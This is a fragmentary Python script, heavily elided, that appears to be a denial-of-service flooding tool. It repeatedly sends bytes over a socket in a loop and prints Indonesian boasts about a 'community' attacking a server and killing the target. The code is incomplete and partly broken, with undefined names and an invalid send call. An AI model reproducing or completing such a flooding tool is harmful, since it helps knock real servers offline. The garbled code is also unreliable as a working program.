...
def Lbytes():
  ...
  while True:
    try:
      ...
      print(i +"[+] PCSI/RTC/PDSI COMMUNITY READY MENEMBUS SERVER!")
    except:
      print("[+] PCSI/RTC/PDSI COMMUNITY READY MENEMBUS SERVER!")
  ...
  while True:
    try:
      ...
      for x in range(times):
        ...
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ HATI-HATI 3 COMMUNITY MENYERANG ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KARENA 3 COMMUNITY =======] ")
